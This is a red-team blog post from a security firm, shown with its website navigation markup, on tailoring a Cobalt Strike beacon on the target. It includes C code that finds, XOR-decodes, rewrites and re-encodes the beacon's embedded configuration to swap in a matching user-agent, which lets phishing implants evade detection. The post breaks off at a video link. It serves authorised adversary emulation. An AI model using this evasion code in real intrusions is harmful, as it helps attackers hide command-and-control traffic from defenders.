                                  <li class="text-lg ml-p32 group/top" @mouseover="setSubNav('subnav-147901')" @mouseleave="setSubNav(false)">

                                      <a class="c-primary-nav-item v-current block overflow-hidden relative z-1 border border-white rounded-lg pt-p4 pb-p6 px-p8 transition-colors duration-500 group-hover/top:text-black hover:text-black focus:text-black before:absolute before:inset-y-0 before:left-0 before:right-full before:duration-500 before:transition-all before:bg-gibson before:-z-1 group-hover/top:before:right-0 group-hover/top:before:bg-gibson hover:before:right-0 hover:before:bg-gibson focus:before:right-0 focus:before:bg-gibson" href="https://trustedsec.com/blog">Blog</a>
                                                      </li>
                                  <li class="text-lg ml-p32 group/top" @mouseover="setSubNav('subnav-3655')" @mouseleave="setSubNav(false)">

                                      <a class="c-primary-nav-item block overflow-hidden relative z-1 rounded-lg pt-p4 pb-p6 px-p8 transition-colors duration-500 group-hover/top:text-black hover:text-black focus:text-black before:absolute before:inset-y-0 before:left-0 before:right-full before:duration-500 before:transition-all before:bg-gibson before:-z-1 group-hover/top:before:right-0 group-hover/top:before:bg-gibson hover:before:right-0 hover:before:bg-gibson focus:before:right-0 focus:before:bg-gibson" href="https://trustedsec.com/resources">Resources</a>
                                                      </li>
                                  <li class="text-lg ml-p32 group/top" @mouseover="setSubNav('subnav-3656')" @mouseleave="setSubNav(false)">

                                      <a class="c-primary-nav-item block overflow-hidden relative z-1 rounded-lg pt-p4 pb-p6 px-p8 transition-colors duration-500 group-hover/top:text-black hover:text-black focus:text-black before:absolute before:inset-y-0 before:left-0 before:right-full before:duration-500 before:transition-all before:bg-gibson before:-z-1 group-hover/top:before:right-0 group-hover/top:before:bg-gibson hover:before:right-0 hover:before:bg-gibson focus:before:right-0 focus:before:bg-gibson" href="https://trustedsec.com/about-us">About Us</a>
                                                        <div class="absolute left-0 z-10 top-full w-full" :class="showSubNav('subnav-3656')" x-ref="subnav-3656">
                      <div class="pt-p28">
                        <div class="bg-code-dark p-p24 w-full flex" data-dropdown>
                          <div class="w-1/2 shrink-0 grow-0 pr-p16 flex flex-col">
                            <div class="mb-p24 last:mb-none">
                              <h2 class="text-h3 mb-p24">About Us</h2>
                                                              <p>Driven by purpose, fueled by experts.</p>
                                                          </div>
                            <div class="mt-auto">
                              <a href="https://trustedsec.com/about-us" class="c-button v-white group appearance-none inline-block relative z-1 overflow-hidden p-p24 bg-transparent text-white border border-white hover:border-gibson focus:border-gibson rounded-p16 text-center text-lg mq1024:text-h3 disabled:opacity-40 disabled:cursor-not-allowed hover:text-black focus:text-black hover:bg-gibson focus:bg-gibson disabled:hover:bg-transparent disabled:hover:text-black hover:border-gibson focus:border-gibson transition-button duration-500 ease-in-out whitespace-nowrap before:absolute before:-z-1 before:inset-y-0 before:left-0 before:right-full before:bg-gibson before:transition-all before:duration-500 hover:before:right-0 hover:before:bg-gibson focus:before:right-0 focus:before:bg-gibson disabled:hover:before:bg-transparent"><svg role="presentation" class="c-icon v-button-white w-p28 h-p28 stroke-none fill-gibson transition-colors group-hover:fill-black group-focus:fill-black mr-p8 -ml-p2"><use href="/custom-ui/icons.svg?1.26#icon-chevron-right" xlink:href="/custom-ui/icons.svg?1.26#icon-chevron-right"   /></svg>About Us</a>                            </div>
                          </div>
                          <ul class="flex-1">
                                                          <li class="mb-p8 last:mb-none">
                                <a class="text-bd p-p16 block transition-colors duration-500 rounded-p16 hover:bg-code focus:bg-code" href="https://trustedsec.com/about-us/our-team">
                                  <div class="flex items-center mb-p12">
                                    <div class="font-mono text-gibson">01</div>
                                    <svg role="presentation" class="c-icon v-reset  fill-white w-p12 h-p12 ml-auto"><use href="/custom-ui/icons.svg?1.26#icon-chevron-right" xlink:href="/custom-ui/icons.svg?1.26#icon-chevron-right"   /></svg>
                                  </div>
                                  <div class="text-bd mb-p8">Our Team</div>
                                                                      <div class="text-sm">Meet our security experts.</div>
                                                                  </a>
                              </li>
                                                          <li class="mb-p8 last:mb-none">
                                <a class="text-bd p-p16 block transition-colors duration-500 rounded-p16 hover:bg-code focus:bg-code" href="https://trustedsec.com/about-us/our-partners">
                                  <div class="flex items-center mb-p12">
                                    <div class="font-mono text-gibson">02</div>
                                    <svg role="presentation" class="c-icon v-reset  fill-white w-p12 h-p12 ml-auto"><use href="/custom-ui/icons.svg?1.26#icon-chevron-right" xlink:href="/custom-ui/icons.svg?1.26#icon-chevron-right"   /></svg>
                                  </div>
                                  <div class="text-bd mb-p8">Our Partners</div>
                                                                      <div class="text-sm">Become a TrustedSec partner to help your customers anticipate and prepare for potential attacks.</div>
                                                                  </a>
                              </li>
                                                          <li class="mb-p8 last:mb-none">
                                <a class="text-bd p-p16 block transition-colors duration-500 rounded-p16 hover:bg-code focus:bg-code" href="https://trustedsec.com/about-us/news">
                                  <div class="flex items-center mb-p12">
                                    <div class="font-mono text-gibson">03</div>
                                    <svg role="presentation" class="c-icon v-reset  fill-white w-p12 h-p12 ml-auto"><use href="/custom-ui/icons.svg?1.26#icon-chevron-right" xlink:href="/custom-ui/icons.svg?1.26#icon-chevron-right"   /></svg>
                                  </div>
                                  <div class="text-bd mb-p8">News</div>
                                                                      <div class="text-sm">Our team is trusted by local and national media to be the subject matter experts for security news.</div>
                                                                  </a>
                              </li>
                                                          <li class="mb-p8 last:mb-none">
                                <a class="text-bd p-p16 block transition-colors duration-500 rounded-p16 hover:bg-code focus:bg-code" href="https://trustedsec.com/about-us/events">
                                  <div class="flex items-center mb-p12">
                                    <div class="font-mono text-gibson">04</div>
                                    <svg role="presentation" class="c-icon v-reset  fill-white w-p12 h-p12 ml-auto"><use href="/custom-ui/icons.svg?1.26#icon-chevron-right" xlink:href="/custom-ui/icons.svg?1.26#icon-chevron-right"   /></svg>
                                  </div>
                                  <div class="text-bd mb-p8">Events</div>
                                                                      <div class="text-sm">See our upcoming webinars, conferences, talks, trainings, and more!</div>
                                                                  </a>
                              </li>
                                                      </ul>
                        </div>
                      </div>
                    </div>
                                    </li>
                              </ul>
              <button class="block relative ml-p40" aria-controls="global-search-form" aria-expanded="false" x-data @click="toggleSearch()" x-ref="btn" x-bind:aria-expanded="search">
                <span><svg role="presentation" class="c-icon v-search w-p20 h-p20 stroke-none fill-gibson transition-colors group-hover:fill-black group-focus:fill-black block w-p16 h-p16 fill-white"><use href="/custom-ui/icons.svg?1.26#icon-search" xlink:href="/custom-ui/icons.svg?1.26#icon-search"   /></svg></span>
                <span class="sr-only">Search</span>
              </button>
            </nav>
          </template>

                    <button class="c-btn-menu block mq1024:hidden relative ml-p32 w-p24 h-p32" @click="toggleMenu()" :aria-expanded="menuOpen ? 'true' : 'false'">
            <span class="bar1 block absolute left-0 right-0 top-1/2 transform -translate-y-p8 bg-white w-p24 h-p2"></span>
            <span class="bar2 block absolute left-0 right-0 top-1/2 transform bg-white w-p24 h-p2"></span>
            <span class="bar3 block absolute left-0 right-0 top-1/2 transform translate-y-p8 bg-white w-p24 h-p2"></span>
            <span class="sr-only">Menu</span>
          </button>
        </div>
      </div>

            <div class="absolute bg-phantom top-full right-0 w-full z-40 mq1024:max-w-sm" @click.outside="closeSearch()">
        <div class="w-full h-none overflow-hidden transition-height duration-500" x-ref="search-window">
          <div class="c-container max-w-p1024 w-full" x-ref="search-container">
            <form id="global-search-form" class="" action="https://trustedsec.com/search" aria-hidden="true" x-show="true" x-transition:leave="block ease-out duration-500" x-bind:aria-hidden="!search">
              <fieldset class="relative">
              <label class="sr-only" for="query">Search Input</label>
              <input class="block w-full bg-phantom pl-p24 py-p16 font-mono placeholder:text-white text-white pr-p80" type="text" id="query" name="query" placeholder="Search..." value="" x-ref="search-input">
              <button class="absolute right-0 inset-y-0 px-p24 h-p48 top-1/2 -translate-y-1/2" type="submit">
                <span class="sr-only">Search</span>
                <svg role="presentation" class="c-icon v-search w-p20 h-p20 stroke-none fill-gibson transition-colors group-hover:fill-black group-focus:fill-black fill-white"><use href="/custom-ui/icons.svg?1.26#icon-search" xlink:href="/custom-ui/icons.svg?1.26#icon-search"   /></svg>
              </button>
              </fieldset>
            </form>
          </div>
        </div>
      </div>
		</div>

          <div x-ref="functional-nav" class="bg-white py-p16 text-black flex mq480:justify-end px-p24">
      

  
  <nav aria-label="Functional Navigation" x-links>
    <ul class="flex mq480:px-p24">
              <li class="relative px-p8 first:pl-none last:pr-none flex items-center">
                    
          <a href="https://trustedsec.com/contact" class="c-button v-url relative z-10 overflow-hidden overflow-ellipsis w-auto inline-block group p-p4 underline rounded-p8 group-hover:text-black group-focus:text-black hover:text-black focus:text-black focus:outline-none transition-colors duration-500 before:absolute before:-z-1 before:inset-y-0 before:left-0 before:right-full before:bg-gibson before:transition-all before:duration-500 before:duration-500 before:rounded-p4 hover:before:right-0 hover:before:bg-gibson focus:before:right-0 focus:before:bg-gibson disabled:hover:before:bg-transparent group-hover:before:right-0 group-hover:before:bg-gibson group-focus:before:right-0 group-focus:before:bg-gibson"><svg role="presentation" class="c-icon v-button-url w-p20 h-p20 stroke-none fill-current group-hover:fill-black group-focus:fill-black transition-colors duration-500 ml-p4 mr-p8 -ml-p2"><use href="/custom-ui/icons.svg?1.26#icon-message" xlink:href="/custom-ui/icons.svg?1.26#icon-message"   /></svg>Contact Us</a>        </li>
              <li class="relative px-p8 first:pl-none last:pr-none flex items-center">
                    
          <a href="https://trustedsec.com/report-a-breach" class="c-button v-url relative z-10 overflow-hidden overflow-ellipsis w-auto inline-block group p-p4 underline rounded-p8 group-hover:text-black group-focus:text-black hover:text-black focus:text-black focus:outline-none transition-colors duration-500 before:absolute before:-z-1 before:inset-y-0 before:left-0 before:right-full before:bg-gibson before:transition-all before:duration-500 before:duration-500 before:rounded-p4 hover:before:right-0 hover:before:bg-gibson focus:before:right-0 focus:before:bg-gibson disabled:hover:before:bg-transparent group-hover:before:right-0 group-hover:before:bg-gibson group-focus:before:right-0 group-focus:before:bg-gibson"><svg role="presentation" class="c-icon v-button-url w-p20 h-p20 stroke-none fill-current group-hover:fill-black group-focus:fill-black transition-colors duration-500 ml-p4 mr-p8 -ml-p2"><use href="/custom-ui/icons.svg?1.26#icon-settings" xlink:href="/custom-ui/icons.svg?1.26#icon-settings"   /></svg>Report a breach</a>        </li>
          </ul>
  </nav>
    </div>
      </div>

		<template x-if="menuMobile">
		<div class="c-nav-panel fixed z-40 bg-black text-white top-0 right-0 left-0 bottom-0 mq480:left-auto mq480:w-p320" :class="menuOpen ? 'js-active' : 'js-inactive'" :aria-hidden="open ? 'false' : 'true'" :style="'margin-top:' + menuHeight + 'px'" x-links>
			<div x-show="!menuHide" class="flex flex-col h-full">

        <nav class="p-p24" aria-label="Primary Navigation" >
										<ul class="">
													<li class="relative text-h3 mb-p32"><a  href="https://trustedsec.com/solutions">Solutions</a></li>
													<li class="relative text-h3 mb-p32"><a  href="https://trustedsec.com/services">Services</a></li>
													<li class="relative text-h3 mb-p32"><a  href="https://trustedsec.com/research">Research</a></li>
													<li class="relative text-h3 mb-p32"><a  href="https://trustedsec.com/blog">Blog</a></li>
													<li class="relative text-h3 mb-p32"><a  href="https://trustedsec.com/resources">Resources</a></li>
													<li class="relative text-h3 mb-p32"><a  href="https://trustedsec.com/about-us">About Us</a></li>
											</ul>
          					<button class="block relative text-h3" aria-controls="global-search-form" aria-expanded="false" x-data @click="toggleSearch()" x-ref="btn" x-bind:aria-expanded="search">
						<span>Search</span>
            <span><svg role="presentation" class="c-icon v-search w-p20 h-p20 stroke-none fill-gibson transition-colors group-hover:fill-black group-focus:fill-black inline-block w-p32 h-p32 fill-white ml-p8"><use href="/custom-ui/icons.svg?1.26#icon-search" xlink:href="/custom-ui/icons.svg?1.26#icon-search"   /></svg></span>
					</button>
				</nav>

                <div class="mt-auto bg-white py-p16 text-black">
          

  
  <nav aria-label="Functional Navigation" x-links>
    <ul class="flex mq480:px-p24">
              <li class="relative px-p8 first:pl-none last:pr-none flex items-center">
                    
          <a href="https://trustedsec.com/contact" class="c-button v-url relative z-10 overflow-hidden overflow-ellipsis w-auto inline-block group p-p4 underline rounded-p8 group-hover:text-black group-focus:text-black hover:text-black focus:text-black focus:outline-none transition-colors duration-500 before:absolute before:-z-1 before:inset-y-0 before:left-0 before:right-full before:bg-gibson before:transition-all before:duration-500 before:duration-500 before:rounded-p4 hover:before:right-0 hover:before:bg-gibson focus:before:right-0 focus:before:bg-gibson disabled:hover:before:bg-transparent group-hover:before:right-0 group-hover:before:bg-gibson group-focus:before:right-0 group-focus:before:bg-gibson"><svg role="presentation" class="c-icon v-button-url w-p20 h-p20 stroke-none fill-current group-hover:fill-black group-focus:fill-black transition-colors duration-500 ml-p4 mr-p8 -ml-p2"><use href="/custom-ui/icons.svg?1.26#icon-message" xlink:href="/custom-ui/icons.svg?1.26#icon-message"   /></svg>Contact Us</a>        </li>
              <li class="relative px-p8 first:pl-none last:pr-none flex items-center">
                    
          <a href="https://trustedsec.com/report-a-breach" class="c-button v-url relative z-10 overflow-hidden overflow-ellipsis w-auto inline-block group p-p4 underline rounded-p8 group-hover:text-black group-focus:text-black hover:text-black focus:text-black focus:outline-none transition-colors duration-500 before:absolute before:-z-1 before:inset-y-0 before:left-0 before:right-full before:bg-gibson before:transition-all before:duration-500 before:duration-500 before:rounded-p4 hover:before:right-0 hover:before:bg-gibson focus:before:right-0 focus:before:bg-gibson disabled:hover:before:bg-transparent group-hover:before:right-0 group-hover:before:bg-gibson group-focus:before:right-0 group-focus:before:bg-gibson"><svg role="presentation" class="c-icon v-button-url w-p20 h-p20 stroke-none fill-current group-hover:fill-black group-focus:fill-black transition-colors duration-500 ml-p4 mr-p8 -ml-p2"><use href="/custom-ui/icons.svg?1.26#icon-settings" xlink:href="/custom-ui/icons.svg?1.26#icon-settings"   /></svg>Report a breach</a>        </li>
          </ul>
  </nav>
        </div>
			</div>
		</div>
	</template>


</header>
<!-- End Global Header -->
		<main id="main" class="main overflow-x-hidden">

			

   



<section class="c-page-header relative bg-code text-white">

    <div class="px-p24 mq768:px-p48 mq1024:px-p56 c-header-wrap v-blog-header">
    <div class="max-w-p1440 mx-auto">
      <div class="flex flex-col mq768:flex-row">
        <div class="flex relative z-20 items-center mq768:w-1/2 order-1 py-p48 mq1024:py-p56 mq768:pr-p64 mq1024:pr-p56">

          <div class="w-full">

            

  
<ul class="mb-p64 mq1024:mb-p80 flex flex-wrap text-white">
                <li class="after:content-['/'] last:after:hidden after:mx-p8"><a class="text-sm hover:underline focus:underline" href="https://trustedsec.com/blog">Blog</a></li>
            <li class="after:content-['/'] last:after:hidden after:mx-p8"><a class="text-sm hover:underline focus:underline" href="https://trustedsec.com/blog/tailoring-cobalt-strike-on-target">Tailoring Cobalt Strike on Target</a></li>
     </ul>
                        <div class="mb-p32">

                              <div class="mb-p16">
                  <span class="font-mono text-sm">January 28, 2021</span>
                </div>
              
                                                                <h1 class="text-h1 mq1280:text-title-xl">Tailoring Cobalt Strike on&nbsp;Target</h1>
                              
                                        </div>

                          <div class="mb-p16">
                <span class="text-h3 inline-block">
                  Written by
                                                            Adam Chester
                                                      </span>
              </div>
            


            
            
            
            <div class="mt-p64">
                              <span class="c-tag inline-block py-p6 px-p4 border border-gibson rounded-p6 text-gibson text-bd mr-p12 mb-p12 whitespace-nowrap">Penetration Testing</span>
                              <span class="c-tag inline-block py-p6 px-p4 border border-gibson rounded-p6 text-gibson text-bd mr-p12 mb-p12 whitespace-nowrap">Red Team Adversarial Attack Simulation</span>
                              <span class="c-tag inline-block py-p6 px-p4 border border-gibson rounded-p6 text-gibson text-bd mr-p12 mb-p12 whitespace-nowrap">Research</span>
                              <span class="c-tag inline-block py-p6 px-p4 border border-gibson rounded-p6 text-gibson text-bd mr-p12 mb-p12 whitespace-nowrap">Security Testing &amp; Analysis</span>
                          </div>
          </div>
        </div>

        <div class="mq768:flex overflow-hidden items-center mq768:justify-end mq768:w-paired-img max-w-p1080 -mx-p24 mq768:mx-none order-2 mq768:absolute inset-y-0 left-paired-img-plus" x-data x-fx-cloak x-fx.left.1200="2rem">
          <div class="relative mq768:static mq768:w-full h-full pt-full -mx-p24 mq768:mx-none">
                          <picture class=" w-full"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/012721-Chester-Cobalt-Blog-LinkedIn.png?w=600&amp;h=600&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1695232909&amp;s=c7304df7553213bc733069ba1b9711de, https://trusted-sec.transforms.svdcdn.com/production/images/012721-Chester-Cobalt-Blog-LinkedIn.png?w=900&amp;h=900&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1695232909&amp;s=99023dc5e1a08f287aa66f516bea78d6 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/012721-Chester-Cobalt-Blog-LinkedIn.png?w=600&amp;h=600&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1695232909&amp;s=66847cfa25aba81017a37d789a706422, https://trusted-sec.transforms.svdcdn.com/production/images/012721-Chester-Cobalt-Blog-LinkedIn.png?w=900&amp;h=900&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1695232909&amp;s=e922708d0a91b90e860fafcaf4a26c89 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/012721-Chester-Cobalt-Blog-LinkedIn.png?w=320&amp;h=320&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1695232909&amp;s=749e3c101eb8344740b70806a2125a44, https://trusted-sec.transforms.svdcdn.com/production/images/012721-Chester-Cobalt-Blog-LinkedIn.png?w=480&amp;h=480&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1695232909&amp;s=ef624b5a6146df7248290498d5b9592f 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/012721-Chester-Cobalt-Blog-LinkedIn.png?w=320&amp;h=320&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1695232909&amp;s=199679c8a35fdbc341a7e9c6f30bbce6, https://trusted-sec.transforms.svdcdn.com/production/images/012721-Chester-Cobalt-Blog-LinkedIn.png?w=480&amp;h=480&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1695232909&amp;s=49772a9896fcde21eda29fc9b06dc830 1.5x"><img class="c-img opacity-0 transition-all duration-300 absolute inset-0 object-cover w-full h-full object-center" src="https://trusted-sec.transforms.svdcdn.com/production/images/012721-Chester-Cobalt-Blog-LinkedIn.png?w=320&amp;h=320&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1695232909&amp;s=199679c8a35fdbc341a7e9c6f30bbce6" loading="eager" x-data="image({mq1024:{width:600,height:600},DEFAULT:{width:320,height:320}})" :width="getSize()" :height="getSize('height')" alt=""></picture>                      </div>
        </div>
      </div>
    </div>
  </div>

</section>


      
			
						<div class="relative"><section id="migratedContent-0" class="c-module relative bg-white text-black py-p64 mq768:py-p96" data-module-num="1" style="z-index: 0;"><div class="px-p24 mq768:px-p48 mq1024:px-p56"><div class="max-w-p1440 mx-auto"><div class="flex flex-col mq1024:flex-row" x-data="{ mobile: ! $breakpoint('mq1024') }" @resize.window="mobile = ! $breakpoint('mq1024')"><div class="mq1024:w-p320 mq1024:pr-p64 grow-0 shrink-0 mq1024:order-1"><template x-if="!mobile"><div><div class="w-full"><p id="share-label" class="text-xs font-mono mb-p16">Share</p><ul id="share-icons" class="flex items-center" aria-describedBy="share-label"><li class="ml-p12"><a href="" target="_blank" title="Share URL" data-target="https://trustedsec.com/blog/tailoring-cobalt-strike-on-target"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-share" /></svg></span><span class="sr-only">Share URL</span></a></li><li class="ml-p12"><a href="/cdn-cgi/l/email-protection#6c531f190e06090f18512f04090f07495e5c031918495e5c1804051f495e5c0d1e18050f0009495e5c0a1e0301495e5c381e191f1809083f090f495e5d4a0d011c570e03081551380d0500031e05020b495e5c2f030e0d0018495e5c3f181e050709495e5c0302495e5c380d1e0b0918495f2d495e5c0418181c1f495f2d495e2a495e2a181e191f1809081f090f420f0301495e2a0e00030b495e2a180d0500031e05020b410f030e0d0018411f181e05070941030241180d1e0b0918" target="_blank" title="Share via Email" data-target="https://trustedsec.com/blog/tailoring-cobalt-strike-on-target"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-email" /></svg></span><span class="sr-only">Share via Email</span></a></li><li class="ml-p12"><a href="http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Ftailoring-cobalt-strike-on-target" target="_blank" title="Share on Facebook" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=300,width=600');return false;" data-target="https://trustedsec.com/blog/tailoring-cobalt-strike-on-target"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-facebook" /></svg></span><span class="sr-only">Share on Facebook</span></a></li><li class="ml-p12"><a href="http://twitter.com/share?text=Tailoring%20Cobalt%20Strike%20on%20Target%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Ftailoring-cobalt-strike-on-target" title="Share on X" rel="nofollow" onclick="javascript:window.open(this.href,'', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=300,width=600');return false;" data-target="https://trustedsec.com/blog/tailoring-cobalt-strike-on-target"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-twitter" /></svg></span><span class="sr-only">Share on X</span></a></li><li class="ml-p12"><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Ftailoring-cobalt-strike-on-target&amp;mini=true" target="_blank" title="Share on LinkedIn" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=700,width=600');return false;" data-target="https://trustedsec.com/blog/tailoring-cobalt-strike-on-target"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-linkedin" /></svg></span><span class="sr-only">Share on LinkedIn</span></a></li></ul></div></div></template></div><div class="w-full mq1024:w-content-well mq1024:order-2 flex-1"><div class="c-content"><figure class="wp-block-image size-large aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2021/01/Untitled.png" alt="" class="wp-image-23511" /></figure><p>We've all been there: you've completed your initial recon, sent in your emails to gather those leaked HTTP headers, spent an age configuring your malleable profile to be just right, set up your CDNs, and spun up your redirectors. Then it's time, you send in your email aaaaaand…nothing. You can see from your DNS diagnostic callbacks that the beacon executed, so what gives? You quickly make a few changes to your payload and resend your phish. But it's too late, a Slack message has been sent, warning everyone to be careful of opening suspicious emails…</p><p>OK, so maybe that's a tad specific, but you get the point. Phishing is getting harder and rightly so—as an industry, we've spent years sending campaign after campaign, openly publishing research on how to evade that new security product with that obscure fronting technique. But we can't really afford to lose what could be our only avenue for gaining access to a target, right?</p><p>Here on the TrustedSec Adversary Emulation team, we've spent a lot of time coming up with ways to ensure that our first payload execution attempt has as much chance of succeeding as possible. One effective technique is offloading the configuration of our command and control (C2) profile to the target by analysing the execution environment and checking our potential connectivity before we ever kick off a beacon. That way, we can be sure that everything will work and look as benign as possible before we let our agent work its magic.</p><p>Unfortunately, this kind of technique isn't supported out-of-the-box on frameworks like Cobalt Strike. In this blog post, we will look at one method that has proved to be useful to achieving this level of customization by patching Cobalt Strike's beacon payload on target.</p><h2>Cobalt Strike Beacon Generation</h2><p>Before we look at what we are doing to squeeze out every last bit of Cobalt Strike customization we can, we first need to understand how our options are embedded within a generated beacon.</p><p>Somewhat ironically for us, this research has already been done by defenders such as SentinelOne's <a href="https://github.com/Sentinel-One/CobaltStrikeParser">CobaltStrikeParser</a> project created by <a href="https://twitter.com/gal_kristal?lang=en">Gal Kristal</a>, which looks to extract information from a binary beacon and displays details to defenders.</p><p>So how is our configuration embedded within a beacon and how do we find it? The first thing we need to do is to scan our beacon for the signature <code>\x2e\x2f\x2e\x2f\x2e\x2c</code>, which is an XOR obfuscated version of the binary blob <code>\x00\x01\x00\x01\x00\x02</code> (the significance of this blob will become apparent as we move through this post).</p><p>Each option added to the beacon configuration is encoded using a header and a data value. The header is made up of three (3) 16-bit values with the format:</p><pre class="wp-block-code"><code>[ ID ] [ DATA TYPE ID ] [ LENGTH OF VALUE ] [ VALUE ]</code></pre><p>The <code>ID</code> field signifies the configuration option that this setting applies to, e.g., if the option refers to the user-agent string, the ID field would be <code>9</code>.</p><p>Next the <code>DATA TYPE ID</code> field is assigned to the data type used for the options value. At the time of writing, the data type IDs supported are:</p><ul><li>1 - Short</li><li>2 - Int</li><li>3 - String</li><li>4 - Data</li></ul><p>Following this is a <code>LENGTH OF VALUE</code> field, which specifies the allocated length in bytes of the option value, which follows the header. An important caveat here is that the length field is set to how much total space is actually allocated for a value. For example, if we have a data type of <code>3</code> and a value of <code>Hello\x00</code>, but the field permits 128 bytes, the length field would be set to <code>128</code>.</p><p>Finally, we have the actual value itself. If we were adding a Port option (which has an <code>ID</code> of 2) of the type <code>Short</code> and a value of <code>3133</code>, this would be represented as:</p><pre class="wp-block-code"><code>[ 2 ] [ 1 ] [ 2 ] [ 3133 ]</code></pre><p>Once our option has been embedded, it is obfuscated with an XOR key of <code>0x2e</code>, which helps to hide everything from the casual "strings" command.</p><p>To make life a bit easier for us as we work with these configuration options, we can use the C struct of:</p><pre class="wp-block-code"><code>struct CSConfigField {
  unsigned short ID;
  unsigned short dataType;
  unsigned short dataLength;
  union {
    unsigned short shortData;
    unsigned int intData;
    char data[1];
  } value;
};</code></pre><p>Now that we know just how our options are embedded within our beacon, we can move on to looking at configuring these options during runtime.</p><h2>Huh?? We Don't Even use IE</h2><p>One thing that we can configure in Cobalt Strike using a malleable profile is the user-agent used by the beacon for HTTP C2 requests. To do this, we would add something like:</p><pre class="wp-block-code"><code>set useragent "something legit";</code></pre><p>We would typically set this to something that we gather during OSINT, but as noted in the documentation, if we fail to provide this configuration option, what we end up with is a random Internet Explorer user-agent. The way Cobalt Strike does this is to select a user-agent from a finite list at random during beacon creation. Some samples are:</p><pre class="wp-block-code"><code>Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MALC)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)</code></pre><p>Now if the target is using IE, this would be somewhat OK (although the OS version would still be a giveaway), but what if a host known to use Chrome or Firefox suddenly starts making IE requests out to a new domain…pretty suspicious.</p><p>This makes an ideal first candidate for customising our beacon payload on target, by finding any active browsers or the default registered browser and updating our <code>useragent</code> option before we kick off our beacon.</p><p>To do this, we first need to find our beacon configuration block, which as we now know can be done by hunting for the <code>\x2e\x2f\x2e\x2f\x2e\x2c</code> signature:</p><pre class="wp-block-code"><code>#define MAX_MALLEABLE_SIGNATURE_LENGTH 6
#define MALLEABLE_SIGNATURE "\x2e\x2f\x2e\x2f\x2e\x2c"
#define MALLEABLE_LENGTH 6
#define MALLEABLE_XOR 0x2e
#define MALLEABLE_CONFIG_SIZE 4096

extern char inmemorybeacon[];
int beaconConfigOffset = 0;
int xorKey = 0;

// Hunt for the Cobalt Strike profile in memory
for (int i = 0; i &lt; beaconLength - MAX_MALLEABLE_SIGNATURE_LENGTH; i++) {
    if (memcmp(beacon + i, MALLEABLE_SIGNATURE, MALLEABLE_LENGTH) == 0) {
        beaconConfigOffset = i;
        xorKey = MALLEABLE_XOR;
    break;
    }
}</code></pre><p>Once we have this, we need to decode the config blob using an XOR key of <code>0x2e</code> :</p><pre class="wp-block-code"><code>char config[MALLEABLE_CONFIG_SIZE];

// Decode the profile using the XOR key we have
for (int i = 0; i &lt; MALLEABLE_CONFIG_SIZE; i++) {
    config[i] = *(beacon + beaconConfigOffset + i) ^ xorKey;
}</code></pre><p>When decoded we can then parse the config until we find the ID of <code>9</code> corresponding to the user-agent option:</p><pre class="wp-block-code"><code>#define CS_OPTION_USERAGENT 9

struct CSConfigField *configField = (struct CSConfigField *)malleable;
while(SWAP_UINT16(configField-&gt;ID) != 0x00) {
  if (SWAP_UINT16(configField-&gt;ID) == CS_OPTION_USERAGENT) {
    // Do something with our user-agent here
        break;
  }

  configField = (struct CSConfigField *)((char *)configField + 6 + SWAP_UINT16(configField-&gt;dataLength));
}</code></pre><p>If we find this option, we will see that we have 128 bytes to play with. We first need to decide on the user-agent most likely to make sense for our target and copy this over to our config:</p><pre class="wp-block-code"><code>userAgent = findBestUserAgentMatch();

memset(configField-&gt;value.data, 0, SWAP_UINT16(configField-&gt;dataLength));
strncpy(configField-&gt;value.data, userAgent, SWAP_UINT16(configField-&gt;dataLength));</code></pre><p>And once we have set this, we then update the config blob and re-XOR before passing execution to the beacon:</p><pre class="wp-block-code"><code>// Re-encode the config to be copied back into memory
for (int i = 0; i &lt; MALLEABLE_CONFIG_SIZE; i++) {
    *(beacon + beaconConfigOffset + i) = config[i] ^ xorKey;
}</code></pre><p>Now if everything goes well, we will end up with our C2 beaconing using our newly configured (and hopefully more accurate) user-agent:</p><figure class="wp-block-embed is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-4-3 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
https://youtu.be/65Ye_uBevrA
